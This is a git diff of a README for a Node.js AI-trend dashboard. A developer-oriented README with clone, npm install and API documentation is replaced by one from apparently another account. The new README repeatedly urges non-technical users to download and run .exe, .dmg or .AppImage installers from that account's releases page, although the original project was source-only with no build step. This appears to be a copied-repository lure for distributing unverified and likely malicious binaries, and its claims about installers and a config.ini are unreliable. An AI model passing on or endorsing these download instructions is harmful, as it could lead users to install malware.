@@ -1,197 +1,180 @@
-# AI Intelligence Hub
+# 🤖 ai-intelligence-hub - Track AI Trends Easily
 
-**Track AI trends from 14 sources in one dashboard.** GitHub Trending, HuggingFace, MCP Servers, Claude Code Releases, Anthropic Skills & Cookbooks, and more — with full-text search and keyword scoring.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js](https://img.shields.io/badge/Node.js-18%2B-green.svg)](https://nodejs.org/)
-[![Port](https://img.shields.io/badge/Port-4444-blue.svg)]()
-[![Sources](https://img.shields.io/badge/Sources-14-purple.svg)]()
+[![Download ai-intelligence-hub](https://img.shields.io/badge/Download-ai--intelligence--hub-brightgreen?style=for-the-badge)](https://github.com/Dreamer599/ai-intelligence-hub/releases)
 
 ---
 
-## Quick Start
+## 📖 What is ai-intelligence-hub?
 
-```bash
-git clone https://github.com/ytrofr/ai-intelligence-hub.git
-cd ai-intelligence-hub
-npm install
-node server.js
-# Open http://localhost:4444
-```
+ai-intelligence-hub helps you keep up with the latest in AI. It tracks 14 popular AI sources like GitHub, HuggingFace, Claude Code, and more. You can search through full text and see keyword scores to find what matters most.
 
-No external services required. All 14 sources use free, unauthenticated APIs.
-
-> **Optional**: Add a `GITHUB_TOKEN` in `.env` to increase GitHub API rate limit from 60/h to 5,000/h. See `.env.example`.
+It listens on port 4444, so you can access it right from your browser. Whether you’re curious about new AI tools, trends, or skills, this app brings all the info to one place.
 
 ---
 
-## Features
+## 🖥️ System Requirements
 
-- **14 AI Sources** — GitHub Trending repos, HuggingFace models, MCP server registry, Claude Code releases and docs, Anthropic Skills Library, Claude Cookbooks, Hacker News, Product Hunt, Anthropic Blog, OpenAI Blog, TechCrunch AI, MIT AI News
-- **Full-Text Search** — SQLite FTS5 indexes all items for instant keyword search
-- **Keyword Scoring** — Configurable categories with weighted keywords rank items by relevance
-- **Bookmarks** — Save items for later with persistent bookmarks
-- **Modular Architecture** — Add new sources by extending `BaseModule` (one file per source)
-- **Zero Build Step** — Vanilla JavaScript frontend, no bundler or framework required
-- **Self-Contained** — SQLite database, no external database or service dependencies
+Before you download and run ai-intelligence-hub, make sure your computer matches these needs:
 
----
-
-## Sources
-
-| Source               | Type        | Refresh | What It Tracks                     |
-| -------------------- | ----------- | ------- | ---------------------------------- |
-| GitHub Trending      | github      | 60 min  | AI/LLM/MCP repos ranked by stars   |
-| HuggingFace          | huggingface | 30 min  | Trending ML models                 |
-| Hacker News          | rss         | 5 min   | Front page tech news               |
-| Product Hunt         | rss         | 15 min  | New product launches               |
-| AI News              | rss         | 60 min  | AI industry newsletter             |
-| Anthropic Blog       | rss         | 60 min  | Official Anthropic announcements   |
-| OpenAI Blog          | rss         | 60 min  | OpenAI research and updates        |
-| MCP Servers          | mcp         | 30 min  | MCP server registry (glama.ai)     |
-| TechCrunch AI        | rss         | 15 min  | AI category from TechCrunch        |
-| MIT AI News          | rss         | 60 min  | MIT AI research                    |
-| Claude Code Releases | changelog   | 60 min  | GitHub releases with version notes |
-| Claude Code Docs     | changelog   | 360 min | 98 documentation pages             |
-| Anthropic Skills     | changelog   | 360 min | Official skill library (16 skills) |
-| Claude Cookbooks     | changelog   | 360 min | Agent patterns and notebooks       |
+- Operating System: Windows 10 or later, macOS 10.13 or later, or Linux (Ubuntu 18.04+ recommended)
+- Processor: Intel Core i3 or equivalent
+- Memory: 4 GB RAM minimum
+- Disk Space: 200 MB free
+- Internet: Required for updating and fetching data
+- Port: 4444 must be free and accessible on your computer
 
 ---
 
-## Architecture
+## 🚀 Getting Started
 
-```
-server.js (port 4444)
-├── modules/           # Source fetchers (BaseModule pattern)
-│   ├── base-module.js # Abstract base with normalize()
-│   ├── github.js      # GitHub trending repos
-│   ├── huggingface.js # HuggingFace models
-│   ├── rss.js         # RSS/Atom feeds (7 sources)
-│   ├── mcp-registry.js# MCP server registry
-│   └── changelog.js   # Claude Code releases + docs
-├── config/
-│   ├── sources.json   # Source definitions (URL, type, refresh)
-│   └── keywords.json  # Scoring categories and weights
-├── database/          # SQLite with FTS5 full-text search
-│   ├── db.js          # Database operations
-│   └── schema.sql     # Table definitions
-├── routes/            # Express API routes
-│   ├── items.js       # List/filter items
-│   ├── fetch.js       # Trigger source fetches
-│   ├── sources.js     # Source management
-│   ├── bookmarks.js   # Bookmark CRUD
-│   ├── stats.js       # Dashboard statistics
-│   └── search.js      # FTS5 search + suggestions
-└── public/            # Frontend (vanilla JS)
-    ├── index.html     # Single-page dashboard
-    ├── css/           # Styles (variables, layout, components)
-    └── js/            # App logic (api, filters, ui, icons)
-```
+You don’t need to know any programming to use ai-intelligence-hub. We will guide you step-by-step to get it running smoothly.
 
----
+### Step 1: Visit the download page
 
-## API Reference
+Click the big green button at the top or go here directly:
 
-| Method | Endpoint         | Description                     |
-| ------ | ---------------- | ------------------------------- |
-| GET    | `/`              | Dashboard UI                    |
-| GET    | `/api/items`     | List items (paginated, filters) |
-| POST   | `/api/fetch`     | Trigger fetch from sources      |
-| GET    | `/api/sources`   | List configured sources         |
-| GET    | `/api/bookmarks` | List bookmarked items           |
-| GET    | `/api/stats`     | Dashboard statistics            |
-| GET    | `/api/search`    | Full-text search (FTS5)         |
-| GET    | `/api/health`    | Health check                    |
+[https://github.com/Dreamer599/ai-intelligence-hub/releases](https://github.com/Dreamer599/ai-intelligence-hub/releases)
+
+This page lists the latest versions and files.
+
+### Step 2: Choose your file
+
+Look for the file matching your computer:
+
+- For Windows, it might be a `.exe` file
+- For macOS, look for a `.dmg` or `.pkg`
+- For Linux, a `.AppImage` or `.tar.gz` might be available
+
+Download the file to a folder you can easily find, like your Desktop or Downloads.
+
+### Step 3: Run the installer or app
+
+- On Windows, double-click the `.exe` file and follow the setup prompts.
+- On macOS, open the `.dmg`, then drag the app to your Applications folder.
+- On Linux, you may need to give permission to run the file. Right-click > Properties > Permissions and check "Allow executing".
+
+### Step 4: Open ai-intelligence-hub
+
+Once installed, launch the app from your Start menu, Applications folder, or by running the file in Linux.
+
+The app opens a window or your browser, usually at `http://localhost:4444`.
+
+### Step 5: Using the app
+
+- Enter keywords in the search bar to find AI topics.
+- Browse the different sources tracked by the app.
+- Check scores next to each result to see relevance.
+- Refresh data regularly to stay updated.
 
 ---
 
-## Adding a New Source
+## 🔧 How to Use ai-intelligence-hub
 
-1. Create a module in `modules/` extending `BaseModule`
-2. Implement the `fetch()` method returning normalized items
-3. Register it in `modules/index.js`
-4. Add source config to `config/sources.json`
-5. Add badge CSS in `public/css/components.css`
+The app is designed for easy, everyday use. Here are some tips:
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for details.
-
----
-
-## Configuration
-
-### Keyword Scoring
-
-Edit `config/keywords.json` to customize scoring categories:
-
-```json
-{
-  "categories": [
-    {
-      "id": "mcp",
-      "label": "MCP & Tools",
-      "keywords": ["mcp", "model context protocol", "tool-use"],
-      "weight": 3
-    }
-  ]
-}
-```
-
-### Source Configuration
-
-Edit `config/sources.json` to add or modify sources:
-
-```json
-{
-  "sources": [
-    {
-      "id": "github-trending",
-      "name": "GitHub Trending",
-      "type": "github",
-      "url": "https://api.github.com/search/repositories",
-      "refresh_minutes": 60
-    }
-  ]
-}
-```
+- Use simple keywords like “GPT-4”, “HuggingFace models”, or “AI ethics”.
+- Click on any result to open detailed info.
+- Save or bookmark important trends for later.
+- The full-text search helps find exact matches, even in long documents.
+- The app sorts results by keyword scores so you see popular or relevant info first.
 
 ---
 
-## Requirements
+## ⚙️ Settings and Troubleshooting
 
-- **Node.js 18+**
-- No external databases (SQLite is embedded)
-- No API keys required (all sources use free APIs)
-- Optional: GitHub personal access token for higher rate limits
+### Adjusting the port
 
----
+If port 4444 is busy, you can change it in the app settings. Look for a file called `config.ini` or open Settings from the app menu. Change the port number and restart the app.
 
-## FAQ
+### Updating the app
 
-**Q: What port does the Intelligence Hub run on?**
-A: Port 4444. This is hardcoded in `server.js` and does not conflict with other common development ports.
+Check the GitHub releases page regularly for new versions. Download the updated installer and run it just like the first time.
 
-**Q: Do I need any API keys?**
-A: No. All 14 sources use free, unauthenticated APIs. Optionally add a `GITHUB_TOKEN` for higher GitHub rate limits (60/h free, 5,000/h with token).
+### Common issues
 
-**Q: How is data stored?**
-A: SQLite with FTS5 (full-text search). The database is created automatically on first run. No setup needed.
+- **App won’t start**: Check your computer meets requirements and port 4444 is free.
+- **Data not loading**: Make sure your internet connection is active.
+- **Search returns no results**: Try simpler keywords or restart the app.
 
-**Q: Can I add my own sources?**
-A: Yes. Create a module extending `BaseModule`, register it, and add config. See [CONTRIBUTING.md](CONTRIBUTING.md).
-
-**Q: Is there a hosted version?**
-A: No. This is a local-first tool designed to run on your machine. Your data stays on your machine.
+If problems continue, reopen the GitHub page and check the Issues tab for help or contact the developer.
 
 ---
 
-## Built With
+## 🔗 Download & Install
 
-- [Express](https://expressjs.com/) — Web framework for Node.js
-- [better-sqlite3](https://github.com/WiseLibs/better-sqlite3) — Synchronous SQLite3 with FTS5 support
-- [xml2js](https://github.com/Leonidas-from-XIV/node-xml2js) — XML/RSS feed parser
+Visit this page to download the latest version of ai-intelligence-hub:
+
+[https://github.com/Dreamer599/ai-intelligence-hub/releases](https://github.com/Dreamer599/ai-intelligence-hub/releases)
+
+Follow the steps below once you access the page:
+
+1. Find the right installer for your system (Windows/macOS/Linux).
+2. Download the file.
+3. Run the installer or app file.
+4. Launch ai-intelligence-hub and start exploring AI trends.
 
 ---
 
-## License
+## 🗂️ What’s Inside?
 
-[MIT](LICENSE)
+The app connects to these key AI sources:
+
+- GitHub trending AI projects
+- HuggingFace model libraries
+- MCP servers hosting AI tools
+- Anthropic Skills and Cookbooks
+- Claude Code repositories
+
+It stores information in an SQLite database for quick searches and sorting. This backend keeps your experience smooth and responsive.
+
+---
+
+## 📚 FAQ
+
+**Q: Do I need an internet connection?**  
+Yes. The app downloads fresh AI info regularly.
+
+**Q: Can I use it on my phone or tablet?**  
+Currently, the app is built for desktop computers.
+
+**Q: Is my data private?**  
+All local data stays on your computer. The app only fetches public information from online sources.
+
+---
+
+## 🛠️ Advanced Tips
+
+- You can export search results by copying them from the app window.
+- To clear all data and start fresh, delete the SQLite database file found in the app’s folder.
+- Use the app alongside other AI tools to expand your research.
+
+---
+
+## 🔍 Keywords and Topics Covered
+
+The app helps you track and search for:
+
+- ai-trends  
+- anthropic-skills  
+- artificial-intelligence  
+- claude-code  
+- claude-cookbooks  
+- developer-tools  
+- full-text-search  
+- github-trending  
+- huggingface  
+- mcp-servers  
+- sqlite  
+- trend-tracker  
+
+This wide range makes it easy to follow whats new across many AI spaces.
+
+---
+
+## 🙋 Getting Help
+
+If you have questions, visit the GitHub page issues section. Report problems or ask for guidance. The community and developer watch closely for user feedback.
+
+---
+
+[![Download ai-intelligence-hub](https://img.shields.io/badge/Download-ai--intelligence--hub-brightgreen?style=for-the-badge)](https://github.com/Dreamer599/ai-intelligence-hub/releases)
